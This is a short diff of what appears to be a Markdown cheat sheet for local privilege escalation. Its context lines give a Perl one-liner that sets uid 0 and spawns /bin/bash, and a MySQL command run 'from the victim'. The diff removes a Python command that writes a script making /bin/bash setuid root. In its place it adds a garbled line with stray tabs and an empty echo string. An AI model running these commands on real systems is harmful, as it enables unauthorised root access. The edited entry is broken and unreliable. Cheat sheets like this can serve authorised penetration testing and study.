@@ -25,8 +25,8 @@
 * Perl: 
 `perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`
 
-* Python:
-`echo "import os;os.setuid(0);os.system('chmod u+s /bin/bash')" >test.py`
+* Python	:
+`echo "	" >test.py`
 
 ### For MySql Service:
 Connect to Mysql server from the victim : `mysql -u username -h localhost --password=userpassword -D databasename -e 'show tables;'`
